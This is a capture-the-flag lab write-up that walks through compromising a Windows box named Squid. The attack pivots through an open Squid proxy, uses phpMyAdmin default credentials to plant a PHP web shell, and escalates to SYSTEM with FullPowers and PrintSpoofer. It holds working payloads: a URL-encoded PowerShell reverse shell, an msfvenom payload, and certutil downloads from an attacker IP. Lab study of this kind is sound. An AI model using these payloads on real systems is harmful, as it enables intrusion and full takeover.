# CTF Writeup: Squid

## Lab Description

This lab demonstrates using a Squid proxy to enumerate open ports on a target and gain initial access via phpMyAdmin with default credentials. Learners will escalate privileges by recovering restricted LOCAL SERVICE privileges through scheduled tasks. Finally, they will exploit the SeImpersonatePrivilege using PrintSpoofer to achieve a SYSTEM shell. This lab emphasizes proxy exploitation, privilege recovery, and abuse of impersonation rights.

---

## Reconaissance

An initial scan revealed following informations about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.108.189
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 18:33 EST
Nmap scan report for 192.168.187.189
Host is up (0.024s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-02T23:34:56
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   22.23 ms 192.168.45.1
2   22.19 ms 192.168.45.254
3   22.79 ms 192.168.251.1
4   32.22 ms 192.168.187.189

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.70 seconds
```

Inspecting webpage running on 3128 is interesting, we have version information on squid proxy. Let's search up for public exploits.

Found CVE-2025-54574 and downloaded it locally.

```
git clone https://github.com/B1ack4sh/Blackash-CVE-2025-54574.git
```

This didn't seem to be vulnerable and I searched for proxy in Hacktricks and found an interesting tool called spose.

Downloaded it locally.

```
git clone https://github.com/aancw/spose.git
```

Ran it and enumerated running mysql service.

```
python spose.py --proxy http://192.168.108.189:3128 --target 192.168.108.189 
Scanning default common ports
Using proxy address http://192.168.108.189:3128
192.168.108.189:3306 seems OPEN
192.168.108.189:8080 seems OPEN
```

Let's configure an proxy using the firefox extension tool called "foxyproxy" it's important to specify the port 3128 because only then we are able to connect to mysql & 8080.

```
Selected HTTP > Target IP of Box 192.168.187.189 & proxy port 3128
```

Now we are able to see the ports behind the proxy 3306 (mysql) & 8080 (webserver)

Let's analyze them!

It's an Apache server running php, which means there is an /phpmyadmin panel.

I was surprisingly able to login with default credentials.

```
root: (blank password)
```

Retrieved phpmyadmin version 5.0.2

Let's search up for webshell possibilities for this specific phpmyadmin version.

The general methodology in adding an webshell, when having access to the mysql database with high rights is as following:

```
1) Create Database "hacker" > Navigate to SQL Input Section
```

2) Prompt the following input and outfile it into webroot of xampserver.

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\shell.php" 
```

We should have an webshell on the following url now: 

```
http://192.168.187.189:8080/shell.php?cmd=whoami
nt authority\local service 
```

It works! Let's start up an reverse connection and potentially gain RCE.

Start up listener

```
nc -lvnp 1337
```

Used the following powershell reverse shell. Navigated to revshells.com inputed local machine ip & listener port. Navigated to PowerShell #3 and chose "URL-Encode" option.

```
powershell%20-nop%20-W%20hidden%20-noni%20-ep%20bypass%20-c%20%22%24TCPClient%20%3D%20New-Object%20Net.Sockets.TCPClient%28%27192.168.45.163%27%2C%201337%29%3B%24NetworkStream%20%3D%20%24TCPClient.GetStream%28%29%3B%24StreamWriter%20%3D%20New-Object%20IO.StreamWriter%28%24NetworkStream%29%3Bfunction%20WriteToStream%20%28%24String%29%20%7B%5Bbyte%5B%5D%5D%24script%3ABuffer%20%3D%200..%24TCPClient.ReceiveBufferSize%20%7C%20%25%20%7B0%7D%3B%24StreamWriter.Write%28%24String%20%2B%20%27SHELL%3E%20%27%29%3B%24StreamWriter.Flush%28%29%7DWriteToStream%20%27%27%3Bwhile%28%28%24BytesRead%20%3D%20%24NetworkStream.Read%28%24Buffer%2C%200%2C%20%24Buffer.Length%29%29%20-gt%200%29%20%7B%24Command%20%3D%20%28%5Btext.encoding%5D%3A%3AUTF8%29.GetString%28%24Buffer%2C%200%2C%20%24BytesRead%20-%201%29%3B%24Output%20%3D%20try%20%7BInvoke-Expression%20%24Command%202%3E%261%20%7C%20Out-String%7D%20catch%20%7B%24_%20%7C%20Out-String%7DWriteToStream%20%28%24Output%29%7D%24StreamWriter.Close%28%29%22
```

Ran the command.

```
http://192.168.187.189:8080/shell.php?cmd=powershell%20-nop%20-W%20hidden%20-noni%20-ep%20bypass%20-c%20%22%24TCPClient%20%3D%20New-Object%20Net.Sockets.TCPClient(%27192.168.45.163%27%2C%201337)%3B%24NetworkStream%20%3D%20%24TCPClient.GetStream()%3B%24StreamWriter%20%3D%20New-Object%20IO.StreamWriter(%24NetworkStream)%3Bfunction%20WriteToStream%20(%24String)%20{[byte[]]%24script%3ABuffer%20%3D%200..%24TCPClient.ReceiveBufferSize%20|%20%25%20{0}%3B%24StreamWriter.Write(%24String%20%2B%20%27SHELL%3E%20%27)%3B%24StreamWriter.Flush()}WriteToStream%20%27%27%3Bwhile((%24BytesRead%20%3D%20%24NetworkStream.Read(%24Buffer%2C%200%2C%20%24Buffer.Length))%20-gt%200)%20{%24Command%20%3D%20([text.encoding]%3A%3AUTF8).GetString(%24Buffer%2C%200%2C%20%24BytesRead%20-%201)%3B%24Output%20%3D%20try%20{Invoke-Expression%20%24Command%202%3E%261%20|%20Out-String}%20catch%20{%24_%20|%20Out-String}WriteToStream%20(%24Output)}%24StreamWriter.Close()%22
```

Gained RCE as user "nt authority\local service".

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.45.163] from (UNKNOWN) [192.168.187.189] 50182
SHELL>
```

Retrieved local.txt in C:/

```
3a3b4c6d26de962c50b06d5141e210e9
```

## Privilege Escalation

Hacktricks documentation has an section on local service accounts and how to escalate privs doing so. There is an tool called "FullPowers" which utilizes the task scheduler service to spawn a new process with all the missing privileges. We can then exploit those privs.

Let's download FullPowers locally first.

```
git clone https://github.com/itm4n/FullPowers.git
```
```
wget https://github.com/itm4n/FullPowers/releases/tag/v0.1/FullPowers.exe
```

Created an Temp folder on the root directory. C:\Temp & navigated inside.

Downloaded .exe onto the target system.

```
certutil -urlcache -f http://192.168.45.163/FullPowers.exe FullPowers.exe
```

Running FullPowers.exe on this shell didn't work, let's create another utilizing msfvenom.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.163 LPORT=443 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
```

Started up listener on port 443

```
nc -lvnp 443
```

Downloaded reverse shell.

```
certutil -urlcache -f http://192.168.45.163/shell.exe shell.exe
```

Executed shell and gained RCE

```
nc -lvnp 443 
listening on [any] 443 ...
connect to [192.168.45.163] from (UNKNOWN) [192.168.187.189] 50226
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Temp>whoami
whoami
nt authority\local service
```

Went into PS mode & executed .exe (if the .exe doesn't work just download it again onto the target system.)

```
powershell
PS C:\Temp> ./FullPowers.exe
./FullPowers.exe
[+] Started dummy thread with id 2484
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

C:\Windows\system32>
```

Since the default privs are available again, we can exploit multiple privileges, let's start with "SeImpersonatePrivilege" and see if we can get system.

We can utilize an tool called "PrintSpoofer.exe" in order for this.

Downloaded it onto the target system.

```
C:\Temp>certutil -urlcache -f http://192.168.45.163/PrintSpoofer.exe PrintSpoofer.exe  
certutil -urlcache -f http://192.168.45.163/PrintSpoofer.exe PrintSpoofer.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

U can abuse the .exe with the following command:

```
C:\Temp>Printspoofer.exe -i -c cmd.exe
Printspoofer.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Retrieved proof.txt in C:\Users\Administrator\Desktop

```
7ff386a02103cf0c9b92d8ccb76bc887
```
